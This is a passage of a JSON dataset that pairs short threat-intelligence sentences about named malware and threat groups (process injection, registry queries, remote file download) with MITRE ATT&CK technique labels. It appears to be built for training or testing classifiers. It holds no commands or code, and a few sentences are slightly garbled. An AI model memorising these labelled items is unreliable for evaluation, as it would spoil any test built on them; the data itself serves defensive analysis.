    "text": "A Lazarus Group malware sample performs reflective DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Matroyshka uses reflective DLL injection to inject the malicious library and execute the RAT.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT copies itself into a running Internet Explorer process to evade detection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PLATINUM has used various methods of process injection including hot patching.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PoisonIvy can inject a malicious DLL into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PoshC2 contains multiple modules for injecting into processes, such as Invoke-PSInject.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit contains a collection of CodeExecution modules that enable by injecting code or reflectively loading a Windows PE file into a process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can migrate into another process using reflective DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "An executable dropped onto victims by Putter Panda aims to inject the specified DLL into a process that would normally be accessing the network, including Outlook Express , Outlook , Internet Explorer , and Firefox .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "After decrypting itself in memory, RARSTONE downloads a DLL file from its C2 server and loads it in the memory space of a hidden Internet Explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA performs a reflective DLL injection using a given pid.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remcos has a command to hide itself through injecting into another process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Remsec can perform DLL injection.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Smoke Loader injects into the Internet Explorer process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Socksbot creates a suspended svchost process and injects its DLL into it.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has relied on injecting its payload directly into the process memory of the victim's preferred browser.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Sykipot injects itself into running instances of outlook , iexplore , or firefox .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Taidoor can perform DLL loading.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "A Threat Group-3390 tool can spawn svchost and inject the payload into that process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TrickBot injects into the svchost process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Tropic Trooper has injected a DLL backdoor into a file dllhost .",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Turla has used Metasploit to perform reflective DLL injection in order to escalate privileges.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Turla has also used PowerSploit's Invoke-ReflectivePEInjection.ps1 to reflectively load a PowerShell payload into a random process on the victim system.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "TURNEDUP is capable of injecting code into the APC queue of a created Rundll32 process as part of an \"Early Bird injection.\"",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has injected code into target processes via thread local storage callbacks.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Wiarp creates a backdoor through which remote attackers can inject files into running processes.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Wingbird performs multiple process injections to hijack system processes and execute malicious code.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda checks processes on the system and if they meet the necessary requirements, it injects into that process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell is injected into a shared SVCHOST process.",
    "command": "",
    "labels": [
      "T1055"
    ]
  },
  {
    "type": "text",
    "text": "ADVSTORESHELL can enumerate registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "APT32's backdoor can query the Windows Registry to gather system information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can check for installed software on the system under the Registry key Uninstall.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has executed the reg query command for Server .",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot searches for certain Registry keys to be configured before executing the payload.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Carbanak checks the Registry key Settings for proxy configurations information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Carbon enumerates values in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT contains watchdog functionality that periodically ensures is set to point to its executable.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "CHOPSTICK provides access to the Windows Registry, which can be used to gather information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Denis queries the Registry for keys and values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Derusbi is capable of enumerating Registry keys and values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "DownPaper searches and reads the value of the Windows Update Registry Run key.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 queried the Registry to identify victim information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Epic uses the rem reg query command to obtain values from Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "FELIXROOT has also used WMI to query the Windows Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key .",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "A variant of HOPLIGHT hooks lsass , and lsass then checks the Registry for the data value 'rdpproto' under the key Name.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can enumerate Registry values, keys, and data.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can enumerate Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Another Lazarus Group malware sample checks for the presence of the following Registry ke -Qt.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "OSInfo queries the registry to look for information about Terminal Services.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "PlugX can enumerate and query for information contained within the Windows Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER may query the Registry by running reg query on a victim.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Proxysvc gathers product names from the Registry ke ProductName and the processor description from the Registry key ProcessorNameString.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Reaver queries the Registry to determine the correct Startup path to use for persistence.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT accesses the SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Shamoon queries several Registry keys to identify hard disk partitions to overwrite.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Stealth Falcon malware attempts to determine the installed version of .NET by querying the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "StoneDrill has looked in the registry to find the default browser path.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "SynAck enumerates Registry keys associated with event logs.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "A Threat Group-3390 tool can read and decrypt stored Registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Ursnif has used Reg to query the Registry for installed programs.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Volgmer checks the system for certain Registry keys.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "WINDSHIELD can gather Registry values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Zebrocy executes the reg query command to obtain information in the Registry.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Zeus Panda checks for the existence of a Registry key and if it contains certain values.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "ZxShell can query the netsvc group value data located in the svchost group Registry key.",
    "command": "",
    "labels": [
      "T1012"
    ]
  },
  {
    "type": "text",
    "text": "Stolen Pencil has a tool to add a Windows admin account in order to allow them to ensure continued access via RDP.",
    "command": "",
    "labels": [
      "T1078"
    ]
  },
  {
    "type": "text",
    "text": "Agent attempts to download an encrypted binary from a specified domain.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT28 has downloaded additional files, including by using a first-stage downloader to contact the C2 server to obtain the second-stage implant.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT3 has a tool that can copy files to remote machines.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT32 has added JavaScript to victim websites to download additional frameworks that profile and compromise website visitors.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT33 has downloaded additional files and programs from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "APT37 has downloaded second stage malware from compromised websites.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Astaroth uses certutil and BITSAdmin to download additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "AuditCred can download files and additional malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Azorult can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Azorult has also downloaded a ransomware payload called Hermes.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BabyShark has downloaded additional files from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BADNEWS is capable of downloading additional files through C2 channels, including a new version of itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BadPatch can download and execute or update malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Bankshot uploads files and secondary payloads to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BISCUIT has a command to download a file from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BITSAdmin can be used to create BITS Jobs to upload and/or download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BONDUPDATER can download or upload files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Briba downloads files onto infected hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "BRONZE BUTLER has used various tools to download files, including DGet .",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Calisto has the capability to upload and download files to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CallMe has the capability to download a file to the victim from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cannon can download a payload for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT is downloaded and installed via an executed Assess leadership areas of interest payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cardinal RAT can also download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "certutil can be used to download files from a given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ChChes is capable of downloading files, including additional modules.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "China Chopper's server component can download remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CHOPSTICK is capable of performing remote file transmission.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CloudDuke downloads and executes additional malware from either a Web address or a Microsoft OneDrive account.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "cmd can be used to copy files to a remotely connected system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Cobalt Group has used public sites such as github and sendspace to upload files and then download them to victim computers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The group's JavaScript backdoor is also capable of downloading files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CoinTicker executes a Python script to download its second stage.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "CORESHELL downloads another dropper from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Crimson contains a command to retrieve files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DarkComet can load any files onto the infected machine to execute.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Daserf can download remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Denis deploys additional backdoors and hacking tools to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dipsind can download remote files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DOGCALL can download and execute additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dragonfly 2.0 copied and installed tools for operations once in the victim environment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "DustySky searches for network drives and removable media and duplicates itself onto them.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Dyre has a command to download and executes additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "The Ritsol backdoor trojan used by Elderwood can download files onto a compromised host from a remote location.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Elise can download additional files from the C2 server for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Emissary has the capability to download files from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Empire can upload and download to and from a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "esentutl can be used to copy files from a remote host or download files from a given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "EvilBunny has downloaded additional Lua scripts from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Exaramel for Linux has a command to download a file from a remote server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Expand can be used to download or upload a file over a network share.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Felismus can download files from remote servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN10 has deployed Meterpreter stagers and SplinterRAT instances in the victim network after moving laterally.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN7 has downloaded additional malware to execute on the victim's machine, including by using a PowerShell script to launch shellcode that retrieves an additional payload.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "FIN8 has used remote code execution to download subsequent payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Tools used by Gamaredon Group are capable of downloading and executing additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gazer can execute a task to download a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gold Dragon can download additional components from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Gorgon Group malware can download additional files from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "GreyEnergy can download additional modules and payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "H1N1 contains a command to download and execute a file from a remotely hosted URL using WinINet HTTP requests.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HAWKBALL has downloaded additional files from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Helminth can download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hi-Zor has the ability to upload and download files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HiddenWasp downloads a tar compressed archive from a download server to the system.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HOPLIGHT has the ability to connect to a remote host in order to upload and download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HTTPBrowser is capable of writing a file to the compromised system from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Hydraq creates a backdoor through which remote attackers can download files and additional malware components.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "HyperBro has the ability to download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "InvisiMole can upload files to the victim's machine for operations.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Ixeshe can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "JHUHUGIT can retrieve an additional payload from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "JPIN can download files and upgrade itself.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "jRAT can download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KARAE can upload and download files, including second-stage malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kasidet has the ability to download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "KeyBoy has a download and upload functionality.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Koadic can download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Kwampirs downloads additional files from C2 servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Several Lazarus Group malware families are capable of downloading and executing binaries from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has downloaded additional scripts and files from adversary-controlled servers.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Leviathan has also used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LightNeuron has the ability to download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Linfo creates a backdoor through which remote attackers can download files onto compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LockerGoga has been observed moving around the victim network via SMB, indicating the actors behind this ransomware are manually copying files form computer to computer instead of self-propagating.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "LOWBALL uses the Dropbox API to request two files, one of which is the same file as the one dropped by the malicious email attachment.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "This is most likely meant to be a mechanism to update the compromised host with a new version of the LOWBALL malware.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Magic Hound has downloaded additional code and files from servers onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "menuPass has installed updates and new malware on victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Micropsia can download and execute an executable from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MiniDuke can download additional encrypted backdoors onto the victim via GIF files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Misdat is capable of downloading files from the C2.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mivast has the capability to download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "MobileOrder has a command to download a file from the C2 server to the victim mobile device's SD card.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "More_eggs can download and launch additional payloads.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Mosquito can upload and download files to the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NanHaiShu can download additional files from URLs.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NanoCore has the capability to download and activate additional modules for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NavRAT can download files remotely.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NDiskMonitor can download and execute a file from given URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Nerex creates a backdoor through which remote attackers can download files onto a compromised host.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Nidiran can download and execute files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "NOKKI has downloaded a remote module for execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OilRig can download remote files onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Olympic Destroyer attempts to copy itself to remote machines on the network.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "OopsIE can download files from its C2 server to the victim's machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Orz can download files onto the victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pasam creates a backdoor through which remote attackers can upload files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Patchwork payloads download additional files from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pisloader has a command to upload a file to the victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PLAINTEE has downloaded and executed additional plugins.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PlugX has a module to download and execute files on the compromised machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PoisonIvy creates a backdoor through which remote attackers can upload files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "POSHSPY downloads and executes additional PowerShell code and Windows binaries.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PowerDuke has a command to download a file.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "POWERSOURCE has been observed being used to download TEXTMATE and the Cobalt Strike Beacon payload onto victims.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "POWERSTATS can retrieve and execute additional PowerShell payloads from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "POWRUNER can download or upload files from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Psylo has a command to download a file to the system from its C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pteranodon can download and execute additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "PUNCHBUGGY can download additional files and payloads to compromised hosts.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Pupy can upload and download to/from a victim machine.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Rancor has downloaded additional malware, including by using certutil.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RARSTONE downloads its backdoor component from a C2 server and loads it directly into memory.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RATANKBA uploads and downloads information.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RedLeaves is capable of downloading a file from a specified URL.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RemoteCMD copies a file over to the remote system before execution.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Remsec contains a network loader to receive executable modules from remote attackers and run them on the local victim.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "It can also upload and download files over HTTP and HTTPS.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "Revenge RAT has the ability to upload and download files.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RogueRobin can save a new file to the system from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "ROKRAT retrieves additional malicious payloads from the C2 server.",
    "command": "",
    "labels": [
      "T1105"
    ]
  },
  {
    "type": "text",
    "text": "RTM can download additional files.",
    "command": "",
    "labels": [
      "T1105"
    ]
